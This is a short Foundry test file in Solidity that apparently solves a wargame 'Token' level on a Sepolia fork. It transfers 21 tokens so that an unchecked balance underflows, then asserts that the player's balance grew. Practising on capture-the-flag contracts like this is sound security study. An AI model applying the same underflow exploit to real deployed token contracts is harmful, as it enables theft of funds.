// test/Token.t.sol
pragma solidity ^0.8.19;

import "forge-std/Test.sol";



interface IToken {
    function transfer(address _to, uint256 _value) external;
    function balanceOf(address _owner) external view returns (uint256);
}

contract TokenTest is Test {
    IToken private level = IToken(0x321727DA2B6eb4D866381705cD6f9980A5dF5B58);
    address private player = address(this);

    function setUp() public {
        vm.createSelectFork("sepolia");
    }

    function test_TokenExploit() public {
        level.transfer(address(1), 21);
        assertTrue(level.balanceOf(player) > 0); 
        console.log("Player balance after transfer:", level.balanceOf(player));
    }
}